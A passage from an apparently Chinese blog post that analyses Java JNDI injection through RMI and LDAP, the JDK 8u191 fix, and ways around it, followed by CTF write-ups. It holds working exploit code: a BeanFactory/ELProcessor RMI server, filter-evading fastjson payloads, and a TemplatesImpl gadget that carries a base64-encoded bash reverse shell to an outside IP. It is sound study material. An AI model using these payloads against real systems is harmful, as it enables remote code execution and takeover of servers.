alt="image">​</p><p>那么就是相当于会去在我们的路径下去找我们的恶意类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121059.png" alt="image">​</p><p>加载之后最后在这里进行类的初始化执行了我们的代码，所以只要一执行完这个代码就会弹计算器了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121584.png" alt="image">​</p><p>‍</p><h2 id="LDAP-JNDI"><a href="#LDAP-JNDI" class="headerlink" title="LDAP + JNDI"></a>LDAP + JNDI</h2><p>一样直接起个<code>LDAP</code>​服务下个断点</p><p>经过几层的<code>lookup</code>​方法最后调用到<code>c_lookup</code>​方法中，在这个方法底下会去调用<code>decodeObject</code>​方法将我们传入的ldap对象</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121784.png" alt="image">​</p><p>跟进<code>decodeObject</code>​方法 ，发现会根据<code>LDAP</code>​查询的结果来进行不同方法的调用，因为<code>LDAP</code>​中会有能够存储很多值比如序列化，引用类 等 ，而我们传入的肯定是引用类于是就走到了引用类的判断方法中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121038.png" alt="image">​</p><p>这个方法其实大致了解下即可，就是个去解析我们的<code>Reference</code>​引用对象的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121335.png" alt="image">​</p><p>我们直接看将返回的接口做了什么即可，最后在<code>\rt.jar!\com\sun\jndi\ldap\LdapCtx.java</code>​将返回结果传入了<code>DirectoryManager.getObjectInstance</code>​这个方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121607.png" alt="image">​</p><p>跟进下发现跟<code>RMI</code>​差不多一样去调用了<code>getObjectFactoryFromReference</code>​方法去解析我们的引用类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121827.png" alt="image">​</p><p>后面代码就是跟RMI一模一样了都是去本地找类找不到用<code>URLClassLoader</code>​去远程加载类了</p><p>‍</p><p>‍</p><h1 id="高版本限制"><a href="#高版本限制" class="headerlink" title="高版本限制"></a>高版本限制</h1><p>‍</p><p>其实在之前讲的原理当中可以知道，在jdk8u191之前都是存在这些的，虽然说ldap是低版本的绕过，问题其实也就是可以去远程加载类</p><p>然后更改到jdk8u201之后就不行了，具体改了什么继续调试下</p><p>跟到<code>D:\Environment-Java\java-1.8.0_201\src.zip!\javax\naming\spi\DirectoryManager.java</code>​的关键代码 跟进下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121105.png" alt="image">​</p><p>进行加载类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121505.png" alt="image">​</p><p>本地类加载不成功后看远程类加载的逻辑</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121754.png" alt="image">​</p><p>跟进后发现有一个属性叫<code>trustURLCodebase</code>​ 要等于<code>true</code>​才能够进行远程加载，而默认的<code>trustURLCodebase</code>​是被设置成了<code>false</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121960.png" alt="image">​</p><p>也就是说，只要人为不修改，就不会存在远程加载类的行为了，那也就是说这个远程加载类就是被修复了</p><p>‍</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>‍</p><p>但是转过头来一想，我们远程加载被修复了，但是还可以本地加载</p><p>‍</p><p>所以对于JDK8u191以后得版本来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：</p><p>‍</p><ol><li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令</li><li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行</li></ol><p>‍</p><p>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。我们先来看一些基本概念，然后再分析这两种绕过方法。</p><p>‍</p><h2 id="利用本地恶意Class作为Reference-Factory"><a href="#利用本地恶意Class作为Reference-Factory" class="headerlink" title="利用本地恶意Class作为Reference Factory"></a>利用本地恶意Class作为Reference Factory</h2><p>看名字其实很帅，但是调试一下就可以很清楚理解了</p><p>在<code>D:\Environment-Java\java-1.8.0_201\jre\lib\rt.jar!\com\sun\jndi\ldap\Obj.java</code>​中会去把<code>LDAP</code>​或者<code>RMI</code>​所解析得到的<code>Reference</code>​解出来</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121209.png" alt="image">​</p><p>紧接着跟进到<code>D:\Environment-Java\java-1.8.0_201\src.zip!\javax\naming\spi\DirectoryManager.java#getObjectFactoryFromReference()</code>​可以发现他是接收了两个传参，一个是引用类，另一个是引用类的工厂名字</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121748.png" alt="image">​</p><p>并且返回的类型是<code>ObjectFactory</code>​类(<code>ObjectFactory</code>​其实是一个接口)</p><p>‍</p><p>之后这个工厂类去调用了<code>getObjectInstance</code>​方法，那么现在思路就有了，如果我们去找的是本地的工厂类，并且这此类实现了<code>ObjectFactory</code>​接口并且他还有<code>getObjectInstance</code>​方法，而<code>getObjectInstance</code>​这个方法还有危险的操作，那么就可以进行一个利用了(说起来感觉条件很苛刻)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121979.png" alt="image">​</p><p>但实际上真的有这个类，<code>org.apache.naming.factory.BeanFactory</code>​</p><p>我们去看看这个类</p><p>实现了<code>ObjectFactory</code>​接口</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121233.png" alt="image">​</p><p>‍</p><p>存在<code>getObjectInstance</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121390.png" alt="image">​</p><p>有一个反射的方法,该类的<code>getObjectInstance()</code>​函数中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于<code>Reference</code>​对象，均是攻击者可控的。</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121700.png" alt="image">​</p><p>‍</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jndi.bypass;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">3377</span>);<br>        <span class="hljs-comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;, 详细逻辑见BeanFactory.getObjectInstance代码</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        <span class="hljs-comment">// 利用表达式执行命令</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;, &#x27;/c&#x27;, &#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h2 id="利用LDAP返回序列化数据，触发本地Gadget"><a href="#利用LDAP返回序列化数据，触发本地Gadget" class="headerlink" title="利用LDAP返回序列化数据，触发本地Gadget"></a>利用LDAP返回序列化数据，触发本地Gadget</h2><p>其实这里就是在分析LDAP+JNDI的时候他有个类似swich的东西，当时传入的是引用类，所以走了引用类的逻辑，但是如果我们传入的是序列化的对象，并且后续会被反序列化，那么就相当于存在了一个天然的反序列化入口了，就可以触发本地的Gadget了</p><p>‍</p><p>本地调试下 先添加CC的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar y4-yso.jar CommonsCollections6 <span class="hljs-string">&quot;calc&quot;</span> &gt; 1.ser | <span class="hljs-built_in">base64</span> <br></code></pre></td></tr></table></figure><p>然后传进ldapserver</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar LDAPServer.jar 127.0.0.1 1.txt<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121936.png" alt="image">​</p><p>然后直接去JNDI查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">SayHello</span> <span class="hljs-variable">sayHello</span> <span class="hljs-operator">=</span> (SayHello)initialContext.lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:6666/Evail&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121512.png" alt="image">​</p><p>调试一下</p><p>会走到序列化的逻辑进行反序列化</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121159.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121660.png" alt="image">​</p><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里要注意的点就是 RMI和LDAP都是需要出网的环境进行远程方法调用或者是目录名称查询，所以都是可以操作的，下图是两种方式的jdk适配版本总结，那么其实绕过跟一遍断点即可理解完，都是一些攻防博弈，非常值得学习</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121908.png" alt="0174054c5c01883e9b99a07631b58e3">​</p><p>‍</p><h1 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h1><p>‍</p><h2 id="湖南邀请赛-Login"><a href="#湖南邀请赛-Login" class="headerlink" title="湖南邀请赛 - Login"></a>湖南邀请赛 - Login</h2><p>‍</p><p>tips: 本地是用的是jdk8u65起的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121103.png" alt="image">​</p><p>明显<code>login</code>​路由这存在一个打<code>fastjson</code>​的入口，屏蔽了关键字，看依赖是<code>1.2.47</code>​的fastjson</p><p>第一反应肯定是打以下的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/evilObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>由于过滤了关键字，可以直接用<code>hex</code>​ 跟 <code>unicode</code>​去绕过即可，本地尝试打一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot;@\u0074\u0079\u0070\u0065&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>&#125;,<span class="hljs-string">&quot;password&quot;</span>:&#123;<span class="hljs-string">&quot;@\u0074\u0079\u0070\u0065&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>,<span class="hljs-string">&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/qv9wk6&quot;</span>,<span class="hljs-string">&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121381.png" alt="image">​</p><p>但打远程的时候发现就不可以，那么仔细去分析一下，其实会发现有以下几个原因</p><ol><li>fastjson不出网</li><li>使用的jdk并不是8u65 而是别的jdk</li></ol><p>‍</p><p>首先第一个 打不出网的fastjson打<code>TemplatesImpl</code>​的话并没有开启私有可访问的参数<code>Feature.SupportNonPublicField</code>​,<code>C3P0</code>​,<code>Commons-io</code>​,<code>BCEL</code>​都没有这些依赖，因为依赖非常的清楚只有这些</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121099.png" alt="image">​</p><p>那么我们再来看看他的<code>pom.xml</code>​</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现存在一个用于与 <code>LDAP</code>​ 目录服务器进行通信的一个依赖，所以考虑了下这绕过高版本jdk(本地我换了jdk8u201)实现jndi注入打CC链，所以直接起一个恶意的jndi返回CC6的恶意序列化值即可打反序列化了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot;@\u0074\u0079\u0070\u0065&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>&#125;,<span class="hljs-string">&quot;password&quot;</span>:&#123;<span class="hljs-string">&quot;@\u0074\u0079\u0070\u0065&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>,<span class="hljs-string">&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:6666/Evail&quot;</span>,<span class="hljs-string">&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121288.png" alt="image">​</p><p>但是当时的提示如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121901.png" alt="d663d9ac1e16a1d143cdfa4939d3e35">​</p><p>只是后半段是用了temp去改了下CC6的后半段用了CC3的加载字节码来加载恶意类罢了，但看代码也没过滤Runtime啊，直接打命令执行弹shell就好了把，为了贴合题目提示要求，也写了下加载字节码的，也能成功弹出计算机</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181151742.png"></p><p>‍</p><h2 id="HZNUCTF-2023-final-ezjava"><a href="#HZNUCTF-2023-final-ezjava" class="headerlink" title="[HZNUCTF 2023 final]ezjava"></a>[HZNUCTF 2023 final]ezjava</h2><p>知识点： log4j2 + fastjson原生反序列化 + 高版本JNDI注入绕过</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121187.png" alt="image">​</p><p>访问后提示能够<code>log</code>​你的<code>uri</code>​ 并且提示<code>fastjson 1.2.48 </code>​ 先想到的是<code>log4j</code>​</p><p>于是用log4j的payload去打一下先</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121585.png" alt="image">​</p><p>发现java版本为<code>jdk1.8.0_222</code>​,因为在log4j打的其实就是JNDI注入，所以第一时间想到的就是 此版本已经是jdk8u191之后了，所以就不能够进行远程加载类了，那再探测下<code>fastjson</code>​的1.2.83使用通用的链子来打一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Fastjson;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">F83</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTIuMTM2LjQ2LjI4Lzc5NzkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;qiu&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates, bd);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br>        <span class="hljs-type">byte</span>[] serialize = byteArrayOutputStream.toByteArray();<br>        System.out.println(Base64.getEncoder().encodeToString(serialize));<br><span class="hljs-comment">//                ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="hljs-comment">//        objectInputStream.readObject();</span><br><br>    &#125;&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p>但由于jdk高版本的限制所以要用到一些手法绕过，这里用的就是LDAP返回序列化字符串来打反序列化了</p><p>‍</p><p>起一个恶意的LDAPServer，里面加载了恶意的序列化数据</p><p>LDAPServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 